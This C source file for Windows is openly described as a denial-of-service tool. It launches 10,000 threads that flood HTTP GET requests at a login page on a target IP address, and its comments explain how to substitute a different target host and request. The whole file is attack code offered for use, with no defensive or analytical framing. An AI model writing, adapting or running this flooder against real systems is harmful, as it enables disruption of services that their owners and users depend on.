// A simple program to DOS attack, Here we are attacking the [ Application Layer ], since we are flooding HTTP requests.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>



#define NUM_THREADS 10000
#define REQUESTS_PER_THREAD 7000000
#define SERVER_PORT 80 // Define the server port number. Typically port 80 for HTTP, 443 for HTTPS.

// Link against ws2_32.lib when using gcc
#pragma comment(lib, "ws2_32")

unsigned __stdcall send_requests(void *arg)
{
    const char *host = (const char *)arg;
    SOCKET sockfd;
    struct sockaddr_in server_addr;

    // Replace the GET request according to the page your trying to DOS, also replace the HOST IP address [ Private or Public IP supports the both ].
    const char *request = "GET /login/login/index.aspx HTTP/2\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n"; // Replace the request you are doing, Example here I am doing a GET request.
    char response[4096];
    int bytes_sent, bytes_received;
    int i;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return (unsigned)1;
    }

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return (unsigned)1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(host);

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Failed to connect: %d\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        return (unsigned)1;
    }

    // Print message if connected successfully
    printf("Connection established. Starting to send requests...\n");

    for (i = 0; i < REQUESTS_PER_THREAD; i++)
    {
        // Send HTTP GET request
        bytes_sent = send(sockfd, request, strlen(request), 0);
        if (bytes_sent == SOCKET_ERROR) {
            printf("Failed to send request: %d\n", WSAGetLastError());
            break;
        }

        // Receive response
        while ((bytes_received = recv(sockfd, response, sizeof(response) - 1, 0)) > 0)
	{
            response[bytes_received] = '\0';
            // Optionally print or process response
        }

        if (bytes_received == SOCKET_ERROR)
	{
            printf("Receive failed: %d\n", WSAGetLastError());
            break;
        }
    }

    closesocket(sockfd);
    WSACleanup();
    return (unsigned)0;
}

int main(int argc, char *argv[])
{
    printf("You have entered %d arguments:\n", argc);


    HANDLE threads[NUM_THREADS];
    const char *host = "192.168.0.100"; // Replace with the IP address of your target server
    unsigned threadID;
    int i;

    for (i = 0; i < NUM_THREADS; i++)
    {
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, send_requests, (void *)host, 0, &threadID);
        if (threads[i] == NULL)
	{
            fprintf(stderr, "Error creating thread %d: %d\n", i, GetLastError());
            return 1;
     	}
    }

   for (i = 0; i < NUM_THREADS; i++)
    {
        WaitForSingleObject(threads[i], INFINITE);
        CloseHandle(threads[i]);
    }
    return 0;
}
